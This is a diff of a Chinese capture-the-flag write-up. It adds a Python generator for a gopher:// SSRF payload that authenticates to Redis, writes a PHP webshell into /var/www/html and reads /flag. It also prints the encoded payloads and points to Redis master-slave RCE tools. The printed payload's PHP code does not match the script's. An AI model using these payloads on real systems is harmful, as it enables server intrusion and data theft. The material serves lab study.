@@ -108,13 +108,74 @@ if(isset($_POST['file'])){
 }
 ```
 
-这里给了提示redis密码为`root`，这里没有写权限所以写不了shell
+这里给了提示redis密码为`root`
+
+用下面脚本生成payload
+
+<pre class="language-python"><code class="lang-python"><strong>from urllib.parse import quote
+</strong>
+protocol="gopher://"
+ip="0.0.0.0"
+port="6379"
+shell="&#x3C;?php system('cat /flag');?>"
+filename="b.php"
+path="/var/www/html"
+passwd="root"
+cmd=["auth root",
+     "set 1 {}".format(shell.replace(" ","${IFS}")),
+     "config set dir {}".format(path),
+     "config set dbfilename {}".format(filename),
+     "save"
+     ]
+payload=''
+if passwd:
+    cmd.insert(0,"AUTH {}".format(passwd))
+payload=protocol+ip+":"+port+"/_"
+def redis_format(arr):
+    CRLF="\r\n"
+    redis_arr = arr.split(" ")
+    cmd=""
+    cmd+="*"+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
+    cmd+=CRLF
+    return cmd
+def generate_payload():
+    global payload
+    for x in cmd:
+        payload += quote(redis_format(x))
+    return payload
+
+print(generate_payload())
+</code></pre>
+
+payload
+
+{% code overflow="wrap" %}
+```
+gopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A2%0D%0A%244%0D%0Aauth%0D%0A%244%0D%0Aroot%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2436%0D%0A%3C%3Fphp%20var_dump%28readfile%28%27/flag%27%29%29%3B%3F%3E%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0Ab.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+```
+{% endcode %}
+
+再URL编码一下
+
+{% code overflow="wrap" %}
+```
+gopher://0.0.0.0:6379/_%252a2%250d%250a%25244%250d%250aauth%250d%250a%25244%250d%250aroot%250d%250a%252a2%250d%250a%25244%250d%250aauth%250d%250a%25244%250d%250aroot%250d%250a%252a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252436%250d%250a%253c%253fphp%2520var_dump%2528readfile%2528%2527%2fflag%2527%2529%2529%253b%253f%253e%250d%250a%252a4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252413%250d%250a%2fvar%2fwww%2fhtml%250d%250a%252a4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25245%250d%250ab.php%250d%250a%252a1%250d%250a%25244%250d%250asave%250d%250a
+```
+{% endcode %}
+
+在靶机直接打?url=payload，然后访问b.php即可
+
+
+
+
 
 预期解法是redis主从复制rce BUU环境有问题复现不了
 
 下载[redis-ssrf](https://github.com/xmsec/redis-ssrf)，修改[ssrf-redis.py](https://github.com/xmsec/redis-ssrf/blob/master/ssrf-redis.py)
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 下载[redis-rogue-server](https://github.com/Dliv3/redis-rogue-server) &#x20;
 
@@ -125,6 +186,10 @@ if(isset($_POST['file'])){
 再运行rogue-server.py
 
 把payload再URL编码一下，在靶机用编码后的payload打过去
+
+
+
+
 
 ## 小结
 
